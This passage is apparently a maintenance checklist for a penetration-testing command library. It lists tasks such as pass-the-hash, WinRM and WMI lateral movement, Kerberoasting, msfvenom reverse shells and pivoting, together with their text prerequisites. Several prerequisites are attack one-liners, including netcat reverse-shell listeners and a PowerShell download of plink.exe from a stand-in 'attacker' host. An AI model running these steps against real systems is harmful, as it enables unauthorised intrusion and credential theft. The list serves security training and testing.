- [ ] **File**: `exploitation/ad-lateral-movement-pth.json`
- [ ] **Current prerequisites (text)**:
  - `NTLM hash`
  - `ADMIN$ share access`
  - `SMB port 445 open`
- [ ] **Action**: Replace with command IDs or create missing commands

### 77. `pth-evil-winrm`

- [ ] **Command ID**: `pth-evil-winrm`
- [ ] **File**: `exploitation/ad-lateral-movement-pth.json`
- [ ] **Current prerequisites (text)**:
  - `NTLM hash obtained`
  - `WinRM enabled on target (port 5985/5986)`
  - `User in Remote Management Users group`
- [ ] **Action**: Replace with command IDs or create missing commands

### 78. `pth-cme-spray`

- [ ] **Command ID**: `pth-cme-spray`
- [ ] **File**: `exploitation/ad-lateral-movement-pth.json`
- [ ] **Current prerequisites (text)**:
  - `CrackMapExec installed`
  - `NTLM hash obtained`
  - `Network access to targets`
- [ ] **Action**: Replace with command IDs or create missing commands

### 79. `pth-cme-exec`

- [ ] **Command ID**: `pth-cme-exec`
- [ ] **File**: `exploitation/ad-lateral-movement-pth.json`
- [ ] **Current prerequisites (text)**:
  - `CrackMapExec installed`
  - `Valid NTLM hash`
  - `Admin access verified with spray first`
- [ ] **Action**: Replace with command IDs or create missing commands

### 80. `pth-verify-hash-format`

- [ ] **Command ID**: `pth-verify-hash-format`
- [ ] **File**: `exploitation/ad-lateral-movement-pth.json`
- [ ] **Current prerequisites (text)**:
  - `CrackMapExec installed`
  - `NTLM hash obtained`
  - `Target accessible`
- [ ] **Action**: Replace with command IDs or create missing commands

### 81. `winrm-enter-pssession`

- [ ] **Command ID**: `winrm-enter-pssession`
- [ ] **File**: `exploitation/ad-lateral-movement-winrm.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell access on compromised Windows host`
  - `WinRM enabled on target (default Windows Server 2012+)`
  - `Port 5985 (HTTP) or 5986 (HTTPS) accessible`
- [ ] **Action**: Replace with command IDs or create missing commands

### 82. `winrm-new-pssession`

- [ ] **Command ID**: `winrm-new-pssession`
- [ ] **File**: `exploitation/ad-lateral-movement-winrm.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell 3.0+ on attacking machine`
  - `WinRM enabled on target`
  - `Valid credentials with remote access`
- [ ] **Action**: Replace with command IDs or create missing commands

### 83. `winrm-invoke-command`

- [ ] **Command ID**: `winrm-invoke-command`
- [ ] **File**: `exploitation/ad-lateral-movement-winrm.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell access on compromised Windows host`
  - `WinRM enabled on target`
  - `Valid credentials`
- [ ] **Action**: Replace with command IDs or create missing commands

### 84. `winrm-winrs`

- [ ] **Command ID**: `winrm-winrs`
- [ ] **File**: `exploitation/ad-lateral-movement-winrm.json`
- [ ] **Current prerequisites (text)**:
  - `winrs.exe available (built-in on Windows)`
  - `WinRM enabled on target`
  - `Valid credentials`
- [ ] **Action**: Replace with command IDs or create missing commands

### 85. `evil-winrm-creds`

- [ ] **Command ID**: `evil-winrm-creds`
- [ ] **File**: `exploitation/ad-lateral-movement-winrm.json`
- [ ] **Current prerequisites (text)**:
  - `Evil-WinRM installed on Kali (default on OSCP lab)`
  - `WinRM enabled on target (port 5985 or 5986 open)`
  - `Valid credentials with Remote Management Users or admin rights`
- [ ] **Action**: Replace with command IDs or create missing commands

### 86. `evil-winrm-hash`

- [ ] **Command ID**: `evil-winrm-hash`
- [ ] **File**: `exploitation/ad-lateral-movement-winrm.json`
- [ ] **Current prerequisites (text)**:
  - `Evil-WinRM installed on Kali`
  - `NTLM hash obtained (secretsdump, mimikatz, etc.)`
  - `WinRM enabled on target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 87. `test-wsman`

- [ ] **Command ID**: `test-wsman`
- [ ] **File**: `exploitation/ad-lateral-movement-winrm.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell access`
  - `Network connectivity to target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 88. `winrm-revshell-invoke`

- [ ] **Command ID**: `winrm-revshell-invoke`
- [ ] **File**: `exploitation/ad-lateral-movement-winrm.json`
- [ ] **Current prerequisites (text)**:
  - `base64-encode-powershell to generate payload`
  - `Netcat listener on Kali: nc -lvnp <LPORT>`
  - `PowerShell access on compromised Windows host`
- [ ] **Action**: Replace with command IDs or create missing commands

### 89. `wmi-legacy-wmic`

- [ ] **Command ID**: `wmi-legacy-wmic`
- [ ] **File**: `exploitation/ad-lateral-movement-wmi.json`
- [ ] **Current prerequisites (text)**:
  - `User must be member of Administrators local group on target`
  - `RPC port 135 open on target`
  - `High-range ports 19152-65535 allowed through firewall`
- [ ] **Action**: Replace with command IDs or create missing commands

### 90. `wmi-invoke-method`

- [ ] **Command ID**: `wmi-invoke-method`
- [ ] **File**: `exploitation/ad-lateral-movement-wmi.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell access on compromised Windows host`
  - `Valid domain credentials with local admin rights`
- [ ] **Action**: Replace with command IDs or create missing commands

### 91. `wmi-new-cimsession`

- [ ] **Command ID**: `wmi-new-cimsession`
- [ ] **File**: `exploitation/ad-lateral-movement-wmi.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell 3.0+ on attacking machine`
  - `Valid credentials with local admin rights`
  - `DCOM enabled on target (default)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 92. `wmi-impacket-exec`

- [ ] **Command ID**: `wmi-impacket-exec`
- [ ] **File**: `exploitation/ad-lateral-movement-wmi.json`
- [ ] **Current prerequisites (text)**:
  - `Impacket installed on Kali (pre-installed on OSCP lab)`
  - `SMB connection to target (port 445)`
  - `Valid credentials or NTLM hash`
- [ ] **Action**: Replace with command IDs or create missing commands

### 93. `wmi-cme-exec`

- [ ] **Command ID**: `wmi-cme-exec`
- [ ] **File**: `exploitation/ad-lateral-movement-wmi.json`
- [ ] **Current prerequisites (text)**:
  - `CrackMapExec installed`
  - `Valid credentials`
  - `SMB access to target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 94. `wmi-powershell-revshell`

- [ ] **Command ID**: `wmi-powershell-revshell`
- [ ] **File**: `exploitation/ad-lateral-movement-wmi.json`
- [ ] **Current prerequisites (text)**:
  - `base64-encode-powershell to generate payload`
  - `Netcat listener on Kali: nc -lvnp 443`
  - `PowerShell access on compromised Windows host`
- [ ] **Action**: Replace with command IDs or create missing commands

### 95. `wmi-verify-enabled`

- [ ] **Command ID**: `wmi-verify-enabled`
- [ ] **File**: `exploitation/ad-lateral-movement-wmi.json`
- [ ] **Current prerequisites (text)**:
  - `PowerShell access`
  - `Network connectivity to target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 96. `mysql-connect-basic`

- [ ] **Command ID**: `mysql-connect-basic`
- [ ] **File**: `exploitation/database-access.json`
- [ ] **Current prerequisites (text)**:
  - `sudo apt install mysql-client`
- [ ] **Action**: Replace with command IDs or create missing commands

### 97. `postgres-connect-basic`

- [ ] **Command ID**: `postgres-connect-basic`
- [ ] **File**: `exploitation/database-access.json`
- [ ] **Current prerequisites (text)**:
  - `sudo apt install postgresql-client`
- [ ] **Action**: Replace with command IDs or create missing commands

### 98. `searchsploit-cve-lookup`

- [ ] **Command ID**: `searchsploit-cve-lookup`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current prerequisites (text)**:
  - `Update ExploitDB: searchsploit -u`
  - `Identify CVE from nmap scan or version research`
- [ ] **Action**: Replace with command IDs or create missing commands

### 99. `searchsploit-service-version`

- [ ] **Command ID**: `searchsploit-service-version`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current prerequisites (text)**:
  - `Get version from: nmap -sV <TARGET>`
  - `Alternative: Banner grabbing with nc <TARGET> <PORT>`
  - `Check service fingerprint manually`
- [ ] **Action**: Replace with command IDs or create missing commands

### 100. `searchsploit-copy-exploit`

- [ ] **Command ID**: `searchsploit-copy-exploit`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current prerequisites (text)**:
  - `Find exploit first: searchsploit <SERVICE> <VERSION>`
  - `Note EDB-ID from search results`
  - `Ensure write permissions in current directory`
- [ ] **Action**: Replace with command IDs or create missing commands

### 101. `nmap-script-help`

- [ ] **Command ID**: `nmap-script-help`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current prerequisites (text)**:
  - `Identify target service and port`
  - `Understand script categories (safe vs intrusive)`
  - `Know target OS/service for appropriate scripts`
- [ ] **Action**: Replace with command IDs or create missing commands

### 102. `nmap-script-args`

- [ ] **Command ID**: `nmap-script-args`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current prerequisites (text)**:
  - `Get script help: nmap --script-help <SCRIPT_NAME>`
  - `Identify required arguments from help`
  - `Create wordlists if needed for brute scripts`
  - `Verify target port is open: nmap -p <PORT> <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 103. `gobuster-dir-common`

- [ ] **Command ID**: `gobuster-dir-common`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current prerequisites (text)**:
  - `Verify web server is up: curl -I http://<TARGET>:<PORT>`
  - `Check robots.txt first: curl http://<TARGET>/robots.txt`
  - `Note web server type from nmap: Apache, IIS, nginx`
- [ ] **Action**: Replace with command IDs or create missing commands

### 104. `gobuster-dir-custom`

- [ ] **Command ID**: `gobuster-dir-custom`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current prerequisites (text)**:
  - `Quick scan first: gobuster-dir-common (identify quick wins)`
  - `Identify web technology: whatweb http://<TARGET>`
  - `Check for rate limiting: Test with small wordlist first`
- [ ] **Action**: Replace with command IDs or create missing commands

### 105. `nikto-comprehensive`

- [ ] **Command ID**: `nikto-comprehensive`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current prerequisites (text)**:
  - `Verify web server is up: curl -I http://<TARGET>:<PORT>`
  - `Run gobuster first: gobuster-dir-common (complement findings)`
  - `Check robots.txt and source code manually`
- [ ] **Action**: Replace with command IDs or create missing commands

### 106. `ssh-login-password`

- [ ] **Command ID**: `ssh-login-password`
- [ ] **File**: `exploitation/ssh-login.json`
- [ ] **Current prerequisites (text)**:
  - `sudo apt install sshpass`
- [ ] **Action**: Replace with command IDs or create missing commands

### 107. `iptables-allow-port`

- [ ] **Command ID**: `iptables-allow-port`
- [ ] **File**: `firewall.json`
- [ ] **Current prerequisites (text)**:
  - `sudo iptables -L -v -n`
- [ ] **Action**: Replace with command IDs or create missing commands

### 108. `iptables-port-forward`

- [ ] **Command ID**: `iptables-port-forward`
- [ ] **File**: `firewall.json`
- [ ] **Current prerequisites (text)**:
  - `sudo iptables -t nat -L -v -n`
- [ ] **Action**: Replace with command IDs or create missing commands

### 109. `iptables-delete-rule`

- [ ] **Command ID**: `iptables-delete-rule`
- [ ] **File**: `firewall.json`
- [ ] **Current prerequisites (text)**:
  - `sudo iptables -L --line-numbers`
- [ ] **Action**: Replace with command IDs or create missing commands

### 110. `ufw-allow-port`

- [ ] **Command ID**: `ufw-allow-port`
- [ ] **File**: `firewall.json`
- [ ] **Current prerequisites (text)**:
  - `sudo ufw status verbose`
- [ ] **Action**: Replace with command IDs or create missing commands

### 111. `firewalld-add-port`

- [ ] **Command ID**: `firewalld-add-port`
- [ ] **File**: `firewall.json`
- [ ] **Current prerequisites (text)**:
  - `sudo firewall-cmd --list-all`
- [ ] **Action**: Replace with command IDs or create missing commands

### 112. `firewalld-port-forward`

- [ ] **Command ID**: `firewalld-port-forward`
- [ ] **File**: `firewall.json`
- [ ] **Current prerequisites (text)**:
  - `sudo firewall-cmd --list-all`
- [ ] **Action**: Replace with command IDs or create missing commands

### 113. `netsh-firewall-add-rule`

- [ ] **Command ID**: `netsh-firewall-add-rule`
- [ ] **File**: `firewall.json`
- [ ] **Current prerequisites (text)**:
  - `netsh advfirewall show allprofiles`
- [ ] **Action**: Replace with command IDs or create missing commands

### 114. `netsh-firewall-port-forward`

- [ ] **Command ID**: `netsh-firewall-port-forward`
- [ ] **File**: `firewall.json`
- [ ] **Current prerequisites (text)**:
  - `ipconfig /all`
- [ ] **Action**: Replace with command IDs or create missing commands

### 115. `netsh-portproxy-add`

- [ ] **Command ID**: `netsh-portproxy-add`
- [ ] **File**: `firewall.json`
- [ ] **Current prerequisites (text)**:
  - `netsh advfirewall firewall add rule name="Allow_<SRC_PORT>" protocol=TCP dir=in localport=<SRC_PORT> action=allow`
- [ ] **Action**: Replace with command IDs or create missing commands

### 116. `netsh-firewall-delete-rule`

- [ ] **Command ID**: `netsh-firewall-delete-rule`
- [ ] **File**: `firewall.json`
- [ ] **Current prerequisites (text)**:
  - `netsh advfirewall firewall show rule name=all`
- [ ] **Action**: Replace with command IDs or create missing commands

### 117. `bloodhound-ingest`

- [ ] **Command ID**: `bloodhound-ingest`
- [ ] **File**: `generated/active-directory-additions.json`
- [ ] **Current prerequisites (text)**:
  - `SharpHound.zip collected`
  - `Neo4j running`
  - `BloodHound running`
- [ ] **Action**: Replace with command IDs or create missing commands

### 118. `psexec-shell`

- [ ] **Command ID**: `psexec-shell`
- [ ] **File**: `generated/active-directory-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Valid credentials`
  - `Admin privileges on target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 119. `secretsdump-hashes`

- [ ] **Command ID**: `secretsdump-hashes`
- [ ] **File**: `generated/active-directory-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Domain Admin or equivalent privileges`
- [ ] **Action**: Replace with command IDs or create missing commands

### 120. `getuserspns-kerberoast`

- [ ] **Command ID**: `getuserspns-kerberoast`
- [ ] **File**: `generated/active-directory-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Valid domain user credentials`
- [ ] **Action**: Replace with command IDs or create missing commands

### 121. `evil-winrm-shell`

- [ ] **Command ID**: `evil-winrm-shell`
- [ ] **File**: `generated/active-directory-additions.json`
- [ ] **Current prerequisites (text)**:
  - `WinRM enabled on target`
  - `Valid credentials`
- [ ] **Action**: Replace with command IDs or create missing commands

### 122. `rubeus-asreproast`

- [ ] **Command ID**: `rubeus-asreproast`
- [ ] **File**: `generated/active-directory-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Domain user access`
  - `Rubeus.exe on target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 123. `rubeus-kerberoast`

- [ ] **Command ID**: `rubeus-kerberoast`
- [ ] **File**: `generated/active-directory-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Domain user access`
  - `Rubeus.exe on target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 124. `msfvenom-linux-shell`

- [ ] **Command ID**: `msfvenom-linux-shell`
- [ ] **File**: `generated/exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `nc -lvnp <LPORT> (listener on attacker)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 125. `msfvenom-windows-shell`

- [ ] **Command ID**: `msfvenom-windows-shell`
- [ ] **File**: `generated/exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `nc -lvnp <LPORT> (listener on attacker)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 126. `msfvenom-staged`

- [ ] **Command ID**: `msfvenom-staged`
- [ ] **File**: `generated/exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `msfconsole with handler`
- [ ] **Action**: Replace with command IDs or create missing commands

### 127. `socat-listener`

- [ ] **Command ID**: `socat-listener`
- [ ] **File**: `generated/exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `socat installed on attacker`
- [ ] **Action**: Replace with command IDs or create missing commands

### 128. `scp-upload`

- [ ] **Command ID**: `scp-upload`
- [ ] **File**: `generated/file-transfer-additions.json`
- [ ] **Current prerequisites (text)**:
  - `SSH access to target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 129. `scp-download`

- [ ] **Command ID**: `scp-download`
- [ ] **File**: `generated/file-transfer-additions.json`
- [ ] **Current prerequisites (text)**:
  - `SSH access to target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 130. `tftp-upload`

- [ ] **Command ID**: `tftp-upload`
- [ ] **File**: `generated/file-transfer-additions.json`
- [ ] **Current prerequisites (text)**:
  - `TFTP server running on attacker: atftpd --daemon --port 69 /tftp`
- [ ] **Action**: Replace with command IDs or create missing commands

### 131. `bitsadmin-download`

- [ ] **Command ID**: `bitsadmin-download`
- [ ] **File**: `generated/file-transfer-additions.json`
- [ ] **Current prerequisites (text)**:
  - `HTTP server running on attacker`
- [ ] **Action**: Replace with command IDs or create missing commands

### 132. `powershell-invoke-webrequest`

- [ ] **Command ID**: `powershell-invoke-webrequest`
- [ ] **File**: `generated/file-transfer-additions.json`
- [ ] **Current prerequisites (text)**:
  - `HTTP server on attacker`
- [ ] **Action**: Replace with command IDs or create missing commands

### 133. `linpeas-run`

- [ ] **Command ID**: `linpeas-run`
- [ ] **File**: `generated/post-exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Transfer linpeas.sh to target`
  - `chmod +x linpeas.sh`
- [ ] **Action**: Replace with command IDs or create missing commands

### 134. `linenum-run`

- [ ] **Command ID**: `linenum-run`
- [ ] **File**: `generated/post-exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Transfer LinEnum.sh`
  - `chmod +x`
- [ ] **Action**: Replace with command IDs or create missing commands

### 135. `les-run`

- [ ] **Command ID**: `les-run`
- [ ] **File**: `generated/post-exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Transfer script`
  - `chmod +x`
- [ ] **Action**: Replace with command IDs or create missing commands

### 136. `pspy-monitor`

- [ ] **Command ID**: `pspy-monitor`
- [ ] **File**: `generated/post-exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Transfer pspy64/pspy32`
  - `chmod +x`
- [ ] **Action**: Replace with command IDs or create missing commands

### 137. `winpeas-run`

- [ ] **Command ID**: `winpeas-run`
- [ ] **File**: `generated/post-exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Transfer winpeas.exe to target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 138. `wes-run`

- [ ] **Command ID**: `wes-run`
- [ ] **File**: `generated/post-exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Run 'systeminfo > systeminfo.txt' on target`
  - `Update database first`
- [ ] **Action**: Replace with command IDs or create missing commands

### 139. `powerup-run`

- [ ] **Command ID**: `powerup-run`
- [ ] **File**: `generated/post-exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Transfer PowerUp.ps1`
- [ ] **Action**: Replace with command IDs or create missing commands

### 140. `privesccheck-run`

- [ ] **Command ID**: `privesccheck-run`
- [ ] **File**: `generated/post-exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Transfer PrivescCheck.ps1`
- [ ] **Action**: Replace with command IDs or create missing commands

### 141. `seatbelt-run`

- [ ] **Command ID**: `seatbelt-run`
- [ ] **File**: `generated/post-exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Transfer Seatbelt.exe`
- [ ] **Action**: Replace with command IDs or create missing commands

### 142. `sharphound-collect`

- [ ] **Command ID**: `sharphound-collect`
- [ ] **File**: `generated/post-exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Domain user access`
- [ ] **Action**: Replace with command IDs or create missing commands

### 143. `bloodhound-analyze`

- [ ] **Command ID**: `bloodhound-analyze`
- [ ] **File**: `generated/post-exploitation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Import SharpHound data`
  - `Neo4j running`
- [ ] **Action**: Replace with command IDs or create missing commands

### 144. `suid-exploit`

- [ ] **Command ID**: `suid-exploit`
- [ ] **File**: `generated/privilege-escalation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `SUID binary identified`
  - `GTFOBins entry exists`
- [ ] **Action**: Replace with command IDs or create missing commands

### 145. `cap-exploit`

- [ ] **Command ID**: `cap-exploit`
- [ ] **File**: `generated/privilege-escalation-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Binary with cap_setuid+ep found`
- [ ] **Action**: Replace with command IDs or create missing commands

### 146. `masscan-fast-scan`

- [ ] **Command ID**: `masscan-fast-scan`
- [ ] **File**: `generated/recon-additions.json`
- [ ] **Current prerequisites (text)**:
  - `sudo privileges for raw sockets`
- [ ] **Action**: Replace with command IDs or create missing commands

### 147. `ldapsearch-dump`

- [ ] **Command ID**: `ldapsearch-dump`
- [ ] **File**: `generated/recon-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Valid credentials`
- [ ] **Action**: Replace with command IDs or create missing commands

### 148. `chisel-socks`

- [ ] **Command ID**: `chisel-socks`
- [ ] **File**: `generated/tunneling-additions.json`
- [ ] **Current prerequisites (text)**:
  - `chisel server --reverse --socks5 running on attacker`
- [ ] **Action**: Replace with command IDs or create missing commands

### 149. `proxychains-config`

- [ ] **Command ID**: `proxychains-config`
- [ ] **File**: `generated/tunneling-additions.json`
- [ ] **Current prerequisites (text)**:
  - `SOCKS proxy running (SSH -D, chisel, etc.)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 150. `sshuttle-vpn`

- [ ] **Command ID**: `sshuttle-vpn`
- [ ] **File**: `generated/tunneling-additions.json`
- [ ] **Current prerequisites (text)**:
  - `SSH access to pivot host`
  - `Python on target`
- [ ] **Action**: Replace with command IDs or create missing commands

### 151. `ligolo-server`

- [ ] **Command ID**: `ligolo-server`
- [ ] **File**: `generated/tunneling-additions.json`
- [ ] **Current prerequisites (text)**:
  - `Create TUN interface: sudo ip tuntap add user $(whoami) mode tun ligolo`
- [ ] **Action**: Replace with command IDs or create missing commands

### 152. `systemctl-start-ssh`

- [ ] **Command ID**: `systemctl-start-ssh`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `OpenSSH server installed: sudo apt install openssh-server`
  - `Firewall allows incoming SSH: sudo ufw allow 22/tcp`
  - `SSH config exists: /etc/ssh/sshd_config`
- [ ] **Action**: Replace with command IDs or create missing commands

### 153. `apache2-start`

- [ ] **Command ID**: `apache2-start`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `Apache installed: sudo apt install apache2`
  - `Files placed in /var/www/html/: sudo cp payload.sh /var/www/html/`
  - `Firewall allows HTTP: sudo ufw allow 80/tcp`
  - `Correct permissions: sudo chmod 644 /var/www/html/file`
- [ ] **Action**: Replace with command IDs or create missing commands

### 154. `ss-listening-ports`

- [ ] **Command ID**: `ss-listening-ports`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `iproute2 package installed (default on modern Linux)`
  - `No sudo required for basic listing (sudo for process names on some systems)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 155. `ip-addr`

- [ ] **Command ID**: `ip-addr`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `iproute2 package installed (default on modern Linux)`
  - `VPN connection active if looking for tun0 interface`
- [ ] **Action**: Replace with command IDs or create missing commands

### 156. `ip-route`

- [ ] **Command ID**: `ip-route`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `iproute2 package installed (default on modern Linux)`
  - `VPN connection active if checking lab routes`
- [ ] **Action**: Replace with command IDs or create missing commands

### 157. `nmap-port-check`

- [ ] **Command ID**: `nmap-port-check`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `Nmap installed: sudo apt install nmap`
  - `Network connectivity to target: ping <TARGET> or ip route get <TARGET>`
  - `Sudo privileges for accurate results`
- [ ] **Action**: Replace with command IDs or create missing commands

### 158. `psql-connect`

- [ ] **Command ID**: `psql-connect`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `PostgreSQL client installed: sudo apt install postgresql-client`
  - `Valid credentials obtained (username/password)`
  - `PostgreSQL port accessible: sudo nmap -p <PORT> -Pn -v <TARGET>`
  - `Port forward if internal network: ssh -L <LOCAL_PORT>:<TARGET>:<PORT> <SSH_USER>@<SSH_HOST>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 159. `smbclient-list-shares`

- [ ] **Command ID**: `smbclient-list-shares`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `smbclient installed: sudo apt install smbclient`
  - `SMB port accessible: sudo nmap -p 445 -Pn -v <TARGET>`
  - `Port forward if internal: ssh -L 445:<TARGET>:445 <USER>@<PIVOT> (requires root for port <1024)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 160. `plink-remote-forward`

- [ ] **Command ID**: `plink-remote-forward`
- [ ] **File**: `pivoting/pivot-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `Plink.exe uploaded to Windows target: powershell wget http://attacker/plink.exe -O plink.exe`
  - `SSH server running on attacker machine: sudo systemctl start ssh`
  - `Firewall allows outbound SSH from Windows: Test-NetConnection <SSH_HOST> -Port 22`
  - `Password authentication enabled: PasswordAuthentication yes in sshd_config`
- [ ] **Action**: Replace with command IDs or create missing commands

### 161. `xfreerdp-connect`

- [ ] **Command ID**: `xfreerdp-connect`
- [ ] **File**: `pivoting/pivot-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `RDP service running on target: nmap -p 3389 -Pn <TARGET>`
  - `Valid credentials obtained (password, hash, or token)`
  - `xfreerdp installed: sudo apt install freerdp2-x11`
- [ ] **Action**: Replace with command IDs or create missing commands

### 162. `ssh-connect`

- [ ] **Command ID**: `ssh-connect`
- [ ] **File**: `pivoting/pivot-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `SSH service running on target: sudo nmap -p 22 -Pn <SSH_HOST>`
  - `Valid credentials or SSH key`
- [ ] **Action**: Replace with command IDs or create missing commands

### 163. `sshuttle-vpn`

- [ ] **Command ID**: `sshuttle-vpn`
- [ ] **File**: `pivoting/pivot-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `SSHuttle installed on attack machine: sudo apt install sshuttle`
  - `Python available on pivot host: which python3 (usually present by default)`
  - `SSH access to pivot host with valid credentials`
  - `Pivot host can route to internal subnet: verify with ip route on pivot`
- [ ] **Action**: Replace with command IDs or create missing commands

### 164. `proxychains-config`

- [ ] **Command ID**: `proxychains-config`
- [ ] **File**: `pivoting/proxychains-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `Proxychains installed: sudo apt install proxychains4`
  - `SOCKS proxy running: ssh -D <SOCKS_PORT> or ssh -R <SOCKS_PORT> (remote dynamic)`
  - `Sudo access to edit /etc/proxychains4.conf or use ~/.proxychains/proxychains.conf`
- [ ] **Action**: Replace with command IDs or create missing commands

### 165. `proxychains-nmap`

- [ ] **Command ID**: `proxychains-nmap`
- [ ] **File**: `pivoting/proxychains-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `Proxychains configured: /etc/proxychains4.conf has correct SOCKS proxy`
  - `SOCKS proxy running: ssh -D <PORT> or ssh -R <PORT>`
  - `Dynamic nmap binary: file $(which nmap) shows 'dynamically linked' (required for LD_PRELOAD)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 166. `proxychains-psql`

- [ ] **Command ID**: `proxychains-psql`
- [ ] **File**: `pivoting/proxychains-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `Proxychains configured with correct SOCKS proxy`
  - `SOCKS proxy running: ssh -D or ssh -R (remote dynamic)`
  - `PostgreSQL credentials obtained from config files or vulnerability`
  - `psql client installed: sudo apt install postgresql-client`
- [ ] **Action**: Replace with command IDs or create missing commands

### 167. `ssh-local-port-forward`

- [ ] **Command ID**: `ssh-local-port-forward`
- [ ] **File**: `pivoting/ssh-tunneling.json`
- [ ] **Current prerequisites (text)**:
  - `SSH access to pivot host with valid credentials or SSH key`
  - `Pivot host can route to destination IP (verify with ip route on pivot)`
  - `Destination service listening and accessible from pivot host`
- [ ] **Action**: Replace with command IDs or create missing commands

### 168. `ssh-dynamic-port-forward`

- [ ] **Command ID**: `ssh-dynamic-port-forward`
- [ ] **File**: `pivoting/ssh-tunneling.json`
- [ ] **Current prerequisites (text)**:
  - `SSH access to pivot host with credentials or key`
  - `Proxychains installed on client: sudo apt install proxychains4`
  - `/etc/proxychains4.conf configured with correct SOCKS server`
- [ ] **Action**: Replace with command IDs or create missing commands

### 169. `ssh-remote-port-forward`

- [ ] **Command ID**: `ssh-remote-port-forward`
- [ ] **File**: `pivoting/ssh-tunneling.json`
- [ ] **Current prerequisites (text)**:
  - `SSH server running on attacker machine: sudo systemctl start ssh`
  - `Strong password set on attacker SSH account: passwd kali`
  - `Password authentication enabled: PasswordAuthentication yes in /etc/ssh/sshd_config`
  - `Outbound SSH (port 22) allowed from compromised client (firewall permits)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 170. `ssh-remote-dynamic-port-forward`

- [ ] **Command ID**: `ssh-remote-dynamic-port-forward`
- [ ] **File**: `pivoting/ssh-tunneling.json`
- [ ] **Current prerequisites (text)**:
  - `OpenSSH client ≥7.6 on compromised host: ssh -V (check version)`
  - `SSH server running on attacker machine: sudo systemctl start ssh`
  - `Password authentication enabled on SSH server: PasswordAuthentication yes in sshd_config`
  - `Proxychains installed on attacker machine: sudo apt install proxychains4`
- [ ] **Action**: Replace with command IDs or create missing commands

### 171. `socat-port-forward`

- [ ] **Command ID**: `socat-port-forward`
- [ ] **File**: `pivoting/ssh-tunneling.json`
- [ ] **Current prerequisites (text)**:
  - `Socat installed on pivot host: which socat (if not found: sudo apt install socat)`
  - `Pivot host can route to destination: ip route, ping <DEST_IP>`
  - `Destination service listening and accessible from pivot`
- [ ] **Action**: Replace with command IDs or create missing commands

### 172. `netsh-portproxy-add`

- [ ] **Command ID**: `netsh-portproxy-add`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current prerequisites (text)**:
  - `Administrator privileges: whoami /priv shows SeDebugPrivilege`
  - `Windows Firewall allows inbound (or create rule with netsh-firewall-add-rule)`
  - `Destination IP routable from Windows host: Test-NetConnection <DEST_IP> -Port <DEST_PORT>`
